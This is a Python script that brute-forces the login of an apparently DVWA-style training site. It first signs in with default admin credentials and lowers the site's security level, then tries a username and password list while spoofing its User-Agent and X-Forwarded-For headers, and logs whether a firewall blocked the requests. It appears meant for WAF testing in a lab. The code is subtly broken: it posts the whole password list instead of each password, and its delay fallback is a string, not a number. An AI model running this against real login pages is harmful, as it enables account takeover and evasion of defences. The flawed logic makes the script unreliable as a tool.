from bs4 import BeautifulSoup
import requests
import sys
import time
import json
from datetime import datetime
from pathlib import Path
import os

# Setup directories and session
logs_dir = Path('logs')
logs_dir.mkdir(exist_ok=True)
session = requests.Session()

# Checking and setting base URL and request rate from command line arguments
if len(sys.argv) > 2:
    base_url = sys.argv[1]  # Receives the base URL as the script argument
    request_rate = sys.argv[2]  # Receives the request rate as the second argument
else:
    print("Base URL and/or request rate were not provided.")
    sys.exit(1)

# Map request rate to a specific time interval
delays = {'low': 10, 'medium': 5, 'high': 3}
delay = delays.get(request_rate, 'medium')  # Default to 'medium' if rate is unrecognized

# Construct the target URL for brute force attacks
target_url = f"{base_url}/vulnerabilities/brute/"
login_url = f"{base_url}/login.php"
security_url = f"{base_url}/security.php"

# Headers to spoof User-Agent and IP address
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
    'X-Forwarded-For': '192.168.1.1'
}

def login_and_setup_security():
    login_response = session.get(login_url)  
    soup = BeautifulSoup(login_response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'}).get('value') if soup.find('input', {'name': 'user_token'}) else None

    login_data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': user_token  
    }
    login_response = session.post(login_url, data=login_data, headers=headers)
    
    
    if 'PHPSESSID' in session.cookies:
        print("Login successful, PHPSESSID:", session.cookies['PHPSESSID'])
    else:
        print("Login failed")
        return

    
    security_response = session.get(security_url)
    soup = BeautifulSoup(security_response.text, 'html.parser')
    security_token = soup.find('input', {'name': 'user_token'}).get('value')
    security_data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': security_token
    }
    session.post(security_url, data=security_data, headers=headers)
    
def brute_force_attack():
    results = []
    total_tests = 0
    tests_passed = 0
    tests_failed = 0

    passwords = ['password', '123456', 'admin123', 'letmein', '12345678']
    for username in ['admin', 'user1', 'user2', 'user3', 'user4']:
        for pw in passwords:
            data = {
                'username': username,
                'password': passwords,
                'Login': 'Login'
            }
            response = session.post(target_url, data=data)
            success = response.status_code == 200 and "Welcome to the password protected area" in response.text
            no_user = response.status_code == 200 and "Welcome to the password protected area" not in response.text
            failure = "Username and/or password incorrect." in response.text
            response_code = response.status_code

            total_tests += 1
            if success:
                tests_passed += 1
                result_status = "PASSED - User exists"
            elif no_user:
                tests_passed += 1
                result_status = "PASSED - Successful request but the user does not exist"
            elif failure:
                tests_failed += 1
                result_status = "FAILED - Incorrect username or password"
            else:
                if response_code in [429, 403]:
                    tests_failed += 1
                    result_status = "FAILED - WAF blocked the brute force attack"
                else:
                    tests_failed += 1
                    result_status = "FAILED - Unknown reason"

            results.append({
                'username': username,
                'password': pw,
                'success': success,
                'failure': failure,
                'response_code': response.status_code,
                'result_status': result_status
            })
            print(f"Test {total_tests}: {result_status} - Username: '{username}', Password: '{pw}'")
            time.sleep(delay)  # Delay between requests based on rate

    # Get the name of the current script
    script_name = os.path.splitext(os.path.basename(__file__))[0]
    # Save results
    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    file_name = f"results_{script_name}_{timestamp}.json"  # Include script name in the file name
    results_file = logs_dir / file_name
    result_summary = {
        'date_time': timestamp,
        'base_url': base_url,
        'total_tests': total_tests,
        'tests_passed': tests_passed,
        'tests_failed': tests_failed,
        'tested_url': target_url,
        'details': results
    }
    with open(results_file, 'w') as f:
        json.dump(result_summary, f, indent=4)
    print(f"Results saved to {results_file}")

if __name__ == "__main__":
    login_and_setup_security()
    brute_force_attack()
